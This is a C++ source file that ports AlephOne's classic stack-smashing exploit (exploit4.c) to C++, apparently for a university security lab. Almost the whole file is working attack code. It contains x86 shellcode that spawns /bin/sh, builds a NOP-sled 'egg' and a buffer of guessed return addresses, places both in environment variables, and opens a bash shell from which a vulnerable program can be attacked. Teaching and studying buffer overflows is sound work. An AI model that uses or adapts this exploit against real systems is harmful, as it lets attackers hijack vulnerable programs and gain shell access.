/*
 * exploit4.cpp "Straightforward" conversion of exploit4.c of AlephOne
 * Stack Smashing.
 
 * pmateti@wright.edu 2016.

 * This file now compiles with g++.  Note the use of std::, the
 * include files, and the return type of main().  The following
 
 * % g++ -o exploit4 exploit4.cpp

 * will work silently (i.e., without warnings or errors).  The Lab L6
 * expects you to use additional flags, namely -ansi -pedantic -Wall.

 * You can run ./exploit4 in a modern Ubuntu.  See exploit4-cpp-typescript.txt
 */

#include <cstdlib>
#include <cstdio>
#include <cstring>

#define DEFAULT_OFFSET                    0
#define DEFAULT_BUFFER_SIZE             512
#define DEFAULT_EGG_SIZE               2048
#define NOP                            0x90

char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

unsigned long get_esp(void) {
   __asm__("movl %esp,%eax");
}

int main(int argc, char *argv[]) {
  char *buff, *ptr, *egg;
  long *addr_ptr, addr;
  int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
  int i, eggsize=DEFAULT_EGG_SIZE;

  if (argc > 1) bsize   = atoi(argv[1]);
  if (argc > 2) offset  = atoi(argv[2]);
  if (argc > 3) eggsize = atoi(argv[3]);


  if (!(buff = (char *) std::malloc(bsize))) {
    std::printf("Can't allocate memory.\n");
    exit(0);
  }
  if (!(egg = (char *) std::malloc(eggsize))) {
    std::printf("Can't allocate memory.\n");
    exit(0);
  }

  addr = get_esp() - offset;
  std::printf("Using address: 0x%lx\n", addr);

  ptr = buff;
  addr_ptr = (long *) ptr;
  for (i = 0; i < bsize; i+=4)
    *(addr_ptr++) = addr;

  ptr = egg;
  for (i = 0; i < eggsize - strlen(shellcode) - 1; i++)
    *(ptr++) = NOP;

  for (i = 0; i < strlen(shellcode); i++)
    *(ptr++) = shellcode[i];

  buff[bsize - 1] = '\0';
  egg[eggsize - 1] = '\0';

  std::memcpy(egg,"EGG=",4);
  putenv(egg);
  std::memcpy(buff,"RET=",4);
  putenv(buff);
  system("/bin/bash");
  return 0;
}
